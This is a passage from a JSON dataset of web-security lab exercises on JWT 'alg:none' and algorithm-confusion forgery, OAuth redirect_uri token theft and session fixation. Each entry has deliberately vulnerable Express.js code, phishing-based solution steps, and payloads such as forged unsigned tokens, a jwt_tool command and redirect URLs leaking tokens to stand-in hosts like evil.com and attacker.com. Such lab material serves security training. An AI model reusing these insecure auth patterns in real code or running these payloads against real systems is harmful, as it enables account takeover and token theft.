          "Intercept a valid JWT from your session using Burp Suite and examine the header and payload.",
          "Confirm the server uses 'HS256' by default but does not reject 'none' as a signing algorithm.",
          "Modify the JWT header to: {\"alg\":\"none\",\"typ\":\"JWT\"} and change the payload to {\"username\":\"admin\"}.",
          "Remove the signature completely and use Postman to send the modified token in the Authorization header.",
          "Send GET request to /admin/dashboard with forged JWT and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Token error'); req.user = user; next(); }); }); app.get('/admin/dashboard', (req, res) => { if (req.user.username !== 'admin') return res.status(403).send('Unauthorized'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass lab on http://localhost:3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect and token hijack in third-party flow",
        "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate the redirect_uri parameter. Attackers can craft a malicious link to steal access tokens. To solve: Capture Carlos's OAuth token and access his profile using the stolen token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to analyze the OAuth login request and identify the vulnerable redirect_uri parameter.",
          "Craft a phishing link that sends the token response to a controlled domain (e.g. https://evil.com/callback).",
          "Simulate clicking the crafted OAuth URL using a browser to confirm the token leaks to your endpoint.",
          "Retrieve the access_token sent to your attacker server from the URL fragment.",
          "Use Postman to replay the token to the /profile endpoint via Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const tokens = {}; app.get('/oauth/callback', (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing params');  request.post({ url: 'https://oauth-server/token', form: { code, redirect_uri } }, (err, resp, body) => { const token = JSON.parse(body).access_token; tokens[redirect_uri] = token; res.redirect(redirect_uri + '?access_token=' + token); }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === tokens['https://evil.com/callback']) return res.send('Profile of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect lab on http://localhost:4000'));",
        "payloads": [
          "https://vulnerable.app/oauth/callback?code=xyz&redirect_uri=https://evil.com/callback",
          "https://vulnerable.app/oauth/callback?code=abc&redirect_uri=https://attacker.net/steal"
        ]
      },
      {
        "Lab scenario": "Session fixation in login workflow with predictable session ID",
        "Lab Description": "The application does not regenerate session tokens upon login. This allows attackers to set a session ID before authentication and hijack the session post-login. To solve: Fixate a session for Carlos, then reuse it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate a session while logged out and intercept the Set-Cookie header to capture a session ID.",
          "Send the session cookie to Carlos via a phishing page that sets document.cookie manually.",
          "Have Carlos log in using that session by simulating browser behavior or CSRF lure.",
          "Re-use the same session cookie in your browser and access /account.",
          "Verify that you're logged in as Carlos and access his account dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); const users = { carlos: 'hunter2' }; const sessions = {}; app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.cookies.sid || (Math.random().toString(36).substring(7)); res.cookie('sid', sid); req.sid = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.sid] = username; res.redirect('/account'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (!user) return res.status(401).send('Not logged in'); res.send(`Welcome, ${user}`); }); app.listen(5000, () => console.log('Session Fixation lab running on http://localhost:5000'));",
        "payloads": [
          "sid=abc123 (sent before login, reused after login by victim)",
          "document.cookie='sid=abc123'; window.location='https://vulnerable.app/login'"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session identifier in cookie",
        "Lab Description": "This lab demonstrates a session fixation vulnerability where session identifiers are accepted from the user. The application does not regenerate session tokens upon login. To solve: Fix a session ID, force the victim to authenticate using that session, and access their My account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a GET request to /login and observe the Set-Cookie header.",
          "2. Modify the cookie to a custom value (e.g., session=attacker123) and reload the login page.",
          "3. Share the crafted login link with the victim (e.g., via email or open redirect) to force login with the fixed session.",
          "4. Once victim logs in, reuse the session=attacker123 cookie to access /my-account as the victim.",
          "5. Confirm access to the victim's account page to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest'; sessions[sessId] = { loggedIn: false }; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessId) { sessions[sessId] = { loggedIn: true, username }; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessId = req.cookies.session; const session = sessions[sessId]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "session=attacker123",
          "session=fixatedtoken",
          "session=xyz987"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'alg':'none' bypass",
        "Lab Description": "The application uses JWT for user authentication but fails to validate the signature when the algorithm is set to 'none'. The backend incorrectly trusts JWT tokens regardless of signature when alg is 'none'. To solve: Forge an admin JWT and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite or Postman to capture a JWT-authenticated request after login.",
          "2. Decode the JWT using jwt.io and observe the structure and claims.",
          "3. Modify the 'alg' field to 'none' and change the payload's 'role' claim to 'admin'.",
          "4. Remove the signature portion and reassemble the JWT with only the header and payload.",
          "5. Use the forged token in the Authorization header to access /admin and confirm success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'admin', password: 'admin123', role: 'admin' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(403).send('Forbidden'); } } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "JWT with 'alg':'none' and no signature",
          "Base64(header) + '.' + Base64(payload) + '.'"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allowing code injection via open redirect",
        "Lab Description": "The application uses a third-party OAuth provider for authentication but lacks proper redirect_uri validation. An attacker can inject a malicious redirect URI to intercept the authorization code. To solve: Capture a valid authorization code issued to the victim and use it to log in as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to map the login flow and identify the redirect_uri parameter in the OAuth flow.",
          "2. Modify the redirect_uri to point to your own server that captures query parameters.",
          "3. Craft a phishing link using the malicious redirect_uri and send it to the victim.",
          "4. Once the victim authorizes access, capture the authorization code from the query string.",
          "5. Use Postman to send a request to the token endpoint with the captured code and log in as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirectUri = req.query.redirect_uri; const state = 'xyz'; const authUrl = `https://oauth.example.com/auth?response_type=code&client_id=123&redirect_uri=${redirectUri}&state=${state}`; res.redirect(authUrl); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth.example.com/token', { code, client_id: '123', client_secret: 'secret', redirect_uri: 'http://vulnerable-app.com/callback' }); if (tokenRes.data.access_token) res.send('Login successful'); else res.send('Login failed'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
        "payloads": [
          "redirect_uri=http://attacker.com/intercept?code=",
          "https://vulnerable-app.com/login?redirect_uri=http://evil.com/capture",
          "https://oauth.example.com/auth?client_id=123&redirect_uri=http://attacker.site/log&response_type=code"
        ]
      },
      {
        "Lab scenario": "JWT tampering via none algorithm in login API",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly validates the token's signature algorithm. The login endpoint issues a signed JWT that includes user roles. However, the server accepts tokens with 'alg':'none' without signature verification. To solve: escalate privileges by tampering with the JWT and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Capture the JWT issued upon successful login using Burp Suite.",
          "2. Decode the JWT using jwt.io or a local script and note the algorithm and user role.",
          "3. Modify the JWT header to use \"alg\":\"none\" and change the payload role to \"admin\".",
          "4. Reconstruct the JWT without a signature and replace the Authorization header in Burp.",
          "5. Send a GET request to /admin-panel and verify access is granted using the tampered token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'user', password: 'pass', role: 'user' }]; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Admin access granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin access granted'); res.status(403).send('Forbidden'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on http://localhost:3000'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "{\"alg\":\"none\"} + {\"username\":\"carlos\",\"role\":\"admin\"}",
          "JWT with base64-encoded header.payload and no signature"
        ]
      },
      {
        "Lab scenario": "Session fixation via static session ID assignment",
        "Lab Description": "The application assigns session identifiers before authentication and fails to regenerate the session ID after login. This allows an attacker to fix a known session ID and force a victim to use it, enabling full session hijacking after login. To solve: log the victim in using the fixed session and access their profile page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Visit the application and capture the Set-Cookie header using OWASP ZAP.",
          "2. Note that the session ID remains the same pre- and post-login.",
          "3. Generate a malicious login link embedding a known session ID (e.g., using a hidden iframe).",
          "4. Trick the victim into logging in with this fixed session via phishing or social engineering.",
          "5. Use the known session ID to access /profile while impersonating the victim after login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { res.send(`<form method='POST' action='/login'><input name='username'/><input name='password'/><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); req.session.user = username; res.redirect('/profile'); }); app.get('/profile', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on http://localhost:3000'));",
        "payloads": [
          "Use preset session cookie: sessionId=knownSessionID",
          "Malicious link: http://target-app/login with crafted cookie header",
          "Force session: document.cookie = 'connect.sid=knownSessionID'"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allowing token reuse across clients",
        "Lab Description": "The app integrates with an external OAuth provider but does not restrict token audience. As a result, access tokens issued for one client (mobile app) can be reused on the web client. To solve: intercept a token issued to another client and reuse it on the vulnerable web interface to access user info.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to proxy traffic from the mobile app emulator (or inspect API calls).",
          "2. Capture an OAuth access token issued to the mobile client during login flow.",
          "3. Observe the token lacks 'aud' or 'azp' checks on the server side.",
          "4. Send the token to the web client's /user-info endpoint via Postman.",
          "5. Receive unauthorized access to a web user profile using the reused token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ id: 1, name: 'carlos', email: 'carlos@domain.com' }]; const oauthPublicKey = 'public-oauth-key'; app.post('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, oauthPublicKey, { algorithms: ['RS256'], ignoreExpiration: false }); const user = users.find(u => u.email === decoded.email); if (user) return res.json(user); res.status(404).send('User not found'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('OAuth Token Reuse Lab running on http://localhost:3000'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
          "Use mobile-issued access token on /user-info endpoint",
          "Token with mismatched audience field used in web flow"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in authorization header",
        "Lab Description": "The application implements JWT-based authentication using the RS256 algorithm, but fails to properly validate the algorithm header, allowing algorithm substitution attacks. The application accepts JWT tokens in the Authorization header to access protected resources. To solve: forge a valid JWT token with admin privileges and access the /admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT and decode it using jwt.io or Burp Decoder.",
          "Observe that the 'alg' is set to RS256 but the server does not enforce key type during validation.",
          "Replace 'alg' with HS256 and use the public RSA key as the HMAC secret to re-sign the token using a tool like jwt_tool or CyberChef.",
          "Modify the payload to include { \"role\": \"admin\" } and sign it using HS256 and the public key.",
          "Send a request with the forged JWT in the Authorization header to /admin and verify access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const PUBLIC_KEY = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PUBLIC_KEY); if (decoded.role === 'admin') { return res.send('Welcome Admin'); } res.status(403).send('Not authorized'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" } signed with public key as HMAC",
          "jwt_tool token.jwt -X -a HS256 -s public.pem -p '{\"role\":\"admin\"}'"
        ]
      },
      {
        "Lab scenario": "Session fixation via unvalidated session token reuse",
        "Lab Description": "The application sets a session cookie before login but fails to generate a new session upon authentication, making it vulnerable to session fixation. The session ID is stored in a cookie named 'sessionid'. To solve: fix a session before login, force the victim to log in, and reuse their session to access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP or Burp Suite to capture a GET /login request and obtain a pre-auth sessionid cookie.",
          "Send the crafted login link to the victim with the sessionid set via a cookie or URL parameter.",
          "Wait until the victim logs in and their account is bound to the fixed session.",
          "Replay the sessionid cookie in a GET /account request.",
          "Access the account dashboard and confirm it belongs to the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': 'password123' }; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) { res.send(`Welcome ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
        "payloads": [
          "Set-Cookie: sessionid=fixed123; path=/",
          "https://example.com/login?sessionid=fixed123",
          "GET /account with Cookie: sessionid=fixed123 after victim logs in"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leak via referrer header",
        "Lab Description": "The application uses the OAuth 2.0 implicit grant flow for authentication but redirects users to a third-party domain while retaining the access token in the URL fragment. This results in the token being leaked via the Referer header. To solve: steal the victim's access token and use it to retrieve their profile information.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Set up a malicious site or Burp Collaborator endpoint to collect Referer headers.",
          "Send a crafted phishing link to the victim: https://vuln-app.com/callback#access_token=xyz123...",
          "Ensure the application redirects to a malicious domain like https://attacker.com/log",
          "Capture the full Referer containing the access_token using the Collaborator payload.",
          "Replay the token in an Authorization header to GET /api/userinfo and extract the user's email."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'xyz123': 'carlos@example.com' }; app.get('/callback', (req, res) => { res.redirect('https://attacker.com/log'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (accessTokens[token]) { res.send(`Email: ${accessTokens[token]}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "https://vuln-app.com/callback#access_token=xyz123",
          "GET /api/userinfo with Authorization: Bearer xyz123",
          "Referer: https://vuln-app.com/callback#access_token=xyz123 sent to https://attacker.com/log"
        ]
      },
      {
        "Lab scenario": "Session Fixation in Login Flow",
        "Lab Description": "The application uses a custom session mechanism without regenerating session IDs after login. The application issues a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID, get the victim to use it, then hijack their session to access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept GET /login and note issued session ID in Set-Cookie",
          "Send victim a phishing link with the fixated session ID in a pre-authenticated cookie",
          "Wait until the victim logs in with the attacker-provided session",
          "Reuse the same session ID in attacker’s browser after victim login",
          "Access /dashboard using the fixated session ID to confirm hijack"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].authenticated = true; sessions[sid].username = username; res.redirect('/dashboard'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.authenticated) res.send('Welcome ' + session.username); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
        "payloads": [
          "GET /login (extract Set-Cookie: session=XYZ)",
          "Set-Cookie: session=XYZ (in victim's browser)",
          "Use session=XYZ post victim-login to access /dashboard"
        ]
      },
      {
        "Lab scenario": "JWT Tampering using 'none' Algorithm",
        "Lab Description": "The application trusts JWTs signed with the 'none' algorithm and does not validate their integrity. The JWT is used for session authentication. To solve: Forge an admin token with 'none' as algorithm and escalate privileges.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in and extract JWT token from /auth/login response",
          "Decode JWT at jwt.io and note payload/alg",
          "Modify JWT payload to {\"username\":\"admin\",\"role\":\"admin\"}, set alg to 'none'",
          "Remove signature and re-encode token",
          "Use Burp to inject forged token into Authorization header and access /admin"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'rootpass', role: 'admin' }]; app.post('/auth/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secret'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
        "payloads": [
          "JWT: {\"alg\":\"none\",\"typ\":\"JWT\"}.{\"username\":\"admin\",\"role\":\"admin\"}.",
          "Authorization: Bearer [forged_token]",
          "jwt.io or jwt-tool to manipulate header/payload"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Token Exchange Flow",
        "Lab Description": "The application integrates with an OAuth provider but does not validate the audience (aud) field in the ID token. This allows a malicious app to reuse a token issued for another client. To solve: Use an ID token issued to another client to access protected resources.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Postman to authorize using attacker-controlled OAuth client",
          "Obtain a valid ID token from the provider using /oauth/token",
          "Replay the ID token to the target app at /auth/callback",
          "The app fails to validate aud field and accepts the token",
          "Access /user/profile to confirm account takeover"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const axios = require('axios'); const app = express(); app.use(express.json()); app.post('/auth/callback', async (req, res) => { const { id_token } = req.body; try { const decoded = jwt.decode(id_token); if (!decoded) return res.status(401).send('Invalid token');  req.session = { user: decoded.email }; res.send('Logged in as ' + decoded.email); } catch (err) { res.status(400).send('Token error'); } }); app.get('/user/profile', (req, res) => { if (!req.session) return res.status(401).send('Not logged in'); res.send('Profile of ' + req.session.user); }); app.listen(5000);",
        "payloads": [
          "Valid ID token from attacker-client with aud=attacker-app",
          "Replay token to /auth/callback of victim app",
          "Decoded payload: {\"email\":\"victim@example.com\",\"aud\":\"attacker-app\"}"
        ]
      },
      {
        "Lab scenario": "Session Fixation in Cookie-Based Login Flow",
        "Lab Description": "The application fails to regenerate session identifiers upon successful login. As a result, an attacker can set a session ID before authentication and reuse it post-login. The application assigns session IDs via cookies before authentication, and fails to issue a new one after. To solve: log in as Carlos using a session fixation attack.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept initial GET /login request using Burp Suite and capture Set-Cookie: sessionId.",
          "Send sessionId=attacker-session in a GET /login request and observe it's accepted unauthenticated.",
          "Craft a phishing email with a link containing the pre-defined session ID and send it to Carlos.",
          "Carlos logs in, binding the fixed session ID to his authenticated session.",
          "Reuse the same sessionId in a new browser session to access /my-account and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sessionId) { const sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); sessions[sid] = { authenticated: false }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (sessions[req.cookies.sessionId]?.authenticated) { res.send('Account: carlos'); } else { res.status(403).send('Forbidden'); } });",
        "payloads": [
          "Cookie: sessionId=attacker-session",
          "Set sessionId via phishing link, e.g., /login with Cookie: sessionId=attacker-session",
          "Reuse: Cookie: sessionId=attacker-session after Carlos logs in"
        ]
      },
      {
        "Lab scenario": "JWT Tampering in Authorization Header",
        "Lab Description": "The application uses JWTs for session management but fails to validate the algorithm properly. It accepts unsigned tokens if the 'alg' is set to 'none'. To solve: forge a JWT for Carlos and access the protected account page without knowing the secret.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Log in as any user and capture the JWT in Authorization: Bearer header using Burp Suite.",
          "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' header set to 'HS256'.",
          "Create a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}.",
          "Remove the signature part and reassemble the JWT.",
          "Send the forged JWT in Authorization: Bearer <token> to /my-account and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === '123') { const token = jwt.sign({ username: 'carlos' }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') res.send('Account: carlos'); else res.status(403).send('Forbidden'); } catch (e) { res.status(400).send('Invalid token'); } });",
        "payloads": [
          "JWT with header: {\"alg\":\"none\"}, payload: {\"username\":\"carlos\"}",
          "Authorization: Bearer <base64(header)>.base64(payload).",
          "Tool: jwt_tool -t jwt -X alg_none -pc '{\"username\":\"carlos\"}'"
        ]
      },
      {
        "Lab scenario": "OAuth Token Leakage in Redirect URI",
        "Lab Description": "The application uses OAuth with an implicit grant flow that leaks access tokens via a redirection URI susceptible to open redirect. This allows attackers to harvest tokens if the user authorizes the app. To solve: steal Carlos's OAuth token and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Inspect the OAuth login flow and identify the redirection URI pattern using OWASP ZAP.",
          "Craft an authorization request with a malicious redirect_uri (e.g., attacker.com/steal-token).",
          "Send the phishing link to Carlos and wait for him to authorize the app.",
          "Capture the token in the fragment portion of the redirected URL.",
          "Replay the token in Authorization: Bearer <token> to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); const users = [{ username: 'carlos' }]; const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token') { const token = Buffer.from('token-carlos').toString('base64'); tokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user === 'carlos') { res.send('OAuth access to carlos'); } else { res.status(403).send('Forbidden'); } });",
        "payloads": [
          "GET /auth?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/steal-token",
          "Captured URL fragment: #access_token=encoded-token&token_type=bearer",
          "Authorization: Bearer token-carlos (decoded)"
        ]
      },
      {
        "Lab scenario": "OAuth login session fixation in third-party auth flow",
        "Lab Description": "The OAuth login implementation in this app fails to issue a new session ID after authentication. The application reuses session cookies from unauthenticated requests. To solve: force a victim to authenticate with a session you control and gain access to their authenticated session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept OAuth login flow using Burp Suite's Proxy while initiating login via 'Login with GitHub'.",
          "Confirm that session cookie remains the same before and after authentication.",
          "Craft a malicious OAuth login URL and send to the victim (phishing or social engineering) while reusing the session cookie.",
          "After victim logs in, use the original session cookie from your browser to access their authenticated session.",
          "Verify successful takeover by navigating to /my-account and seeing the victim's data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const passport = require('passport'); const GitHubStrategy = require('passport-github2').Strategy; app.use(session({ secret: 'vuln-session', resave: true, saveUninitialized: true })); app.use(passport.initialize()); app.use(passport.session()); passport.use(new GitHubStrategy({ clientID: 'GITHUB_ID', clientSecret: 'GITHUB_SECRET', callbackURL: '/auth/github/callback' }, (accessToken, refreshToken, profile, done) => { return done(null, profile); })); app.get('/auth/github', passport.authenticate('github')); app.get('/auth/github/callback', passport.authenticate('github', { failureRedirect: '/' }), (req, res) => { res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { res.send('Welcome ' + req.user.username); }); app.listen(4000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "Set sessionid=attacker-session before auth redirect",
          "Send GitHub OAuth link to victim with attacker’s session cookie",
          "Access /my-account using same cookie after victim login"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'alg=none'",
